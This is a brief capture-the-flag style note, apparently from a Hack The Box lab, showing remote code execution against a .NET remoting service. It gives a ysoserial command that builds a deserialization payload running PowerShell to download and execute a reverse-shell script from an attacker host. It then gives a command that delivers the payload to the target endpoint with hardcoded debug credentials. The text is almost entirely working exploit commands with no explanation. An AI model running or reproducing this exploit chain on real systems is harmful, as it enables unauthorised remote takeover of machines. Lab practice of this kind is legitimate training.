## Remote Code Execution

# Payload


```bash
refik@DESKTOP-0PUM6M0 MINGW64 ~/htb/ExploitRemotingService_Compiled/bin/Release (main)
$ ./ysoserial.exe -f=BinaryFormatter -g=TypeConfuseDelegate -o=raw -c="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.182:8000/reverse.ps1')" > payload
```

# Exploit
```bash
refik@DESKTOP-0PUM6M0 MINGW64 ~/htb/ExploitRemotingService_Compiled/bin/Release (main)
$ ./ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw payload
```